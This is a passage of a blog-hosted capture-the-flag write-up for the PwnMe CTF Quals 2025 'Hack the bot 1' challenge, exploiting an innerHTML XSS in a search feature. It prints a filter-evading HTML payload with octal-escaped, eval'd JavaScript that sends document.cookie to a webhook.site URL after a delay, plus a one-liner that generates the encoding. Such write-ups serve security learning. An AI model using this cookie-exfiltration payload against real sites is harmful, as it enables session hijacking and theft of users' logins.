searchWords.some(word =\u003e word \u0026\u0026 new RegExp(`${word}`, 'ui').test(articleText));\n            if (isMatch) {\n                article.style.display = '';\n                found = true;\n            } else {\n                article.style.display = 'none';\n            }\n        }\n    });\n    const noMatchMessage = document.getElementById('no-match-message');\n    if (!found \u0026\u0026 searchInput) {\n        noMatchMessage.innerHTML = `No results for \"${searchInput}\".`;\n        noMatchMessage.style.display = 'block';\n    } else {\n        noMatchMessage.style.display = 'none';\n    }\n}"])</script><script>self.__next_f.push([1,"12:[\"$\",\"$Le\",\"pre-1\",{\"className\":\"my-2\",\"children\":\"$26\",\"language\":\"js\"}]\n13:[\"$\",\"p\",\"p-3\",{\"children\":\"The idea seems to be that\"}]\n14:[\"$\",\"ul\",\"ul-0\",{\"children\":[\"\\n\",[\"$\",\"li\",\"li-0\",{\"children\":[\"The page automatically populates \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"search-input\"}],\" with our passed-in query string.\"]}],\"\\n\",[\"$\",\"li\",\"li-1\",{\"children\":[\"For each \\\"word\\\" (tokens separated by \",[\"$\",\"a\",\"a-0\",{\"href\":\"https://www.regular-expressions.info/unicode.html#prop\",\"children\":\"characters not in the unicode letter category\"}],\") in our query, we perform a case-insensitive Regex match against the text of each article on the page.\"]}],\"\\n\",[\"$\",\"li\",\"li-2\",{\"children\":[\"If no matches are found, we get direct \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"innerHTML\"}],\" access -\u003e XSS.\"]}],\"\\n\"]}]\n15:[\"$\",\"p\",\"p-4\",{\"children\":\"But there's one last problem; the page's articles look like this:\"}]\n16:[\"$\",\"p\",\"p-5\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/9d840a9b-e1df-4c45-90b5-e9fddd514ea0\",\"alt\":\"image\"}]}]\n17:[\"$\",\"p\",\"p-6\",{\"children\":[\"so we need to be careful about choosing an XSS payload that doesn't match any of the banned tokens above. Looking \",[\"$\",\"a\",\"a-0\",{\"href\":\"https://portswigger.net/web-security/cross-site-scripting/cheat-sheet\",\"children\":\"online\"}],\", one such payload is\"]}]\n18:[\"$\",\"p\",\"p-7\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/b74639aa-e387-4e0a-af9c-166eaee374f5\",\"alt\":\"image\"}]}]\n19:[\"$\",\"$Le\",\"pre-2\",{\"className\":\"my-2\",\"children\":\"\u003cvinh oncontentvisibilityautostatechange=\\\"...\\\" style=display:block;content-visibility:auto\u003e\",\"language\":\"html\"}]\n1a:[\"$\",\"p\",\"p-8\",{\"children\":[\"but our executed JS can't contain any of the banned tokens, either. To be safe, we can use JS's \",[\"$\",\"a\",\"a-0\",{\"href\":\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Deprecated_and_obsolete_features#escape_sequences\",\"children\":\"deprecated octal escape sequence\"}],\" syntax to encode our payload as\"]}]\n1b:[\"$\",\"$Le\",\"pre-3\",{\"className\":\"my-2\",\"children\":\"fetch(`https://webhook.site/b7d64b9c-1be5-4c70-8120-fd9fb57cc68a?a=${document.cookie}`)\",\"language\":\"js\"}]\n1c:[\"$\",\"$Le\",\"pre-4\",{\"className\":\"my-2\",\"children\":\"eval('\\\\146\\\\145\\\\164\\\\143\\\\150\\\\50\\\\140\\\\150\\\\164\\\\164\\\\160\\\\163\\\\72\\\\57\\\\57\\\\167\\\\145\\\\142\\\\150\\\\157\\\\157\\\\153\\\\56\\\\163\\\\151\\\\164\\\\145\\\\57\\\\142\\\\67\\\\144\\\\66\\\\64\\\\142\\\\71\\\\143\\\\55\\\\61\\\\142\\\\145\\\\65\\\\55\\\\64\\\\143\\\\67\\\\60\\\\55\\\\70\\\\61\\\\62\\\\60\\\\55\\\\146\\\\144\\\\71\\\\146\\\\142\\\\65\\\\67\\\\143\\\\143\\\\66\\\\70\\\\141\\\\77\\\\141\\\\75\\\\44\\\\173\\\\144\\\\157\\\\143\\\\165\\\\155\\\\145\\\\156\\\\164\\\\56\\\\143\\\\157\\\\157\\\\153\\\\151\\\\145\\\\175\\\\140\\\\51')\",\"language\":\"js\"}]\n1d:[\"$\",\"p\",\"p-9\",{\"children\":\"One final hiccup: looking at the bot source again,\"}]\n1e:[\"$\",\"$Le\",\"pre-5\",{\"className\":\"my-2\",\"children\":\"        const page = await browser.newPage();\\n        await page.goto(url);\\n\\n        if (url.startsWith(\\\"http://localhost/\\\")) {\\n            await page.setCookie(cookie);\\n        }\",\"language\":\"js\"}]\n1f:[\"$\",\"p\",\"p-10\",{\"children\":[\"the admin visits the page \",[\"$\",\"em\",\"em-0\",{\"children\":\"before\"}],\" setting its cookie. As a simple solution, we can just sleep for a bit before exfiltrating the cookie via XSS,\"]}]\n20:[\"$\",\"$Le\",\"pre-6\",{\"className\":\"my-2\",\"children\":\"console.log([...'setTimeout(() =\u003e fetch(`https://webhook.site/b7d64b9c-1be5-4c70-8120-fd9fb57cc68a?a=${document.cookie}`), 3000)'].map(s =\u003e '\\\\\\\\' + s.charCodeAt(0).toString(8)).join(''))\",\"language\":\"js\"}]\n21:[\"$\",\"p\",\"p-11\",{\"children\":\"giving us a final payload looking like\"}]\n22:[\"$\",\"$Le\",\"pre-7\",{\"className\":\"my-2\",\"children\":\"\u003cvinh oncontentvisibilityautostatechange=\\\"eval('\\\\163\\\\145\\\\164\\\\124\\\\151\\\\155\\\\145\\\\157\\\\165\\\\164\\\\50\\\\50\\\\51\\\\40\\\\75\\\\76\\\\40\\\\146\\\\145\\\\164\\\\143\\\\150\\\\50\\\\140\\\\150\\\\164\\\\164\\\\160\\\\163\\\\72\\\\57\\\\57\\\\167\\\\145\\\\142\\\\150\\\\157\\\\157\\\\153\\\\56\\\\163\\\\15"])</script><script>self.__next_f.push([1,"1\\\\164\\\\145\\\\57\\\\142\\\\67\\\\144\\\\66\\\\64\\\\142\\\\71\\\\143\\\\55\\\\61\\\\142\\\\145\\\\65\\\\55\\\\64\\\\143\\\\67\\\\60\\\\55\\\\70\\\\61\\\\62\\\\60\\\\55\\\\146\\\\144\\\\71\\\\146\\\\142\\\\65\\\\67\\\\143\\\\143\\\\66\\\\70\\\\141\\\\77\\\\141\\\\75\\\\44\\\\173\\\\144\\\\157\\\\143\\\\165\\\\155\\\\145\\\\156\\\\164\\\\56\\\\143\\\\157\\\\157\\\\153\\\\151\\\\145\\\\175\\\\140\\\\51\\\\54\\\\40\\\\63\\\\60\\\\60\\\\60\\\\51')\\\" style=display:block;content-visibility:auto\u003e\",\"language\":\"html\"}]\n23:[\"$\",\"p\",\"p-12\",{\"children\":\"Reporting this to the bot, we get the flag:\"}]\n24:[\"$\",\"p\",\"p-13\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/cf486ec9-946e-4c53-b7ee-80f2c4efab81\",\"alt\":\"image\"}]}]\n25:[\"$\",\"$Le\",\"pre-8\",{\"className\":\"my-2\",\"children\":\"PWNME{D1d_y0U_S4iD-F1lt33Rs?}\",\"language\":\"$undefined\"}]\n"])</script><script>self.__next_f.push([1,"c:[[\"$\",\"title\",\"0\",{\"children\":\"PwnMe CTF Quals 2025 — Hack the bot 1 | kevin.fish\"}],[\"$\",\"meta\",\"1\",{\"name\":\"description\",\"content\":\"I've developed a little application to help me with my pentest missions, with lots of useful payloads! I even let users add new payloads, but since I was in a rush I didn't have time to test the security of my application, could you take care of it ?\"}],[\"$\",\"meta\",\"2\",{\"property\":\"og:title\",\"content\":\"PwnMe CTF Quals 2025 — Hack the bot 1\"}],[\"$\",\"meta\",\"3\",{\"property\":\"og:description\",\"content\":\"I've developed a little application to help me with my pentest missions, with lots of useful payloads! I even let users add new payloads, but since I was in a rush I didn't have time to test the security of my application, could you take care of it ?\"}],[\"$\",\"meta\",\"4\",{\"name\":\"twitter:card\",\"content\":\"summary\"}],[\"$\",\"meta\",\"5\",{\"name\":\"twitter:title\",\"content\":\"PwnMe CTF Quals 2025 — Hack the bot 1\"}],[\"$\",\"meta\",\"6\",{\"name\":\"twitter:description\",\"content\":\"I've developed a little application to help me with my pentest missions, with lots of useful payloads! I even let users add new payloads, but since I was in a rush I didn't have time to test the security of my application, could you take care of it ?\"}]]\n8:null\n"])</script></body></html>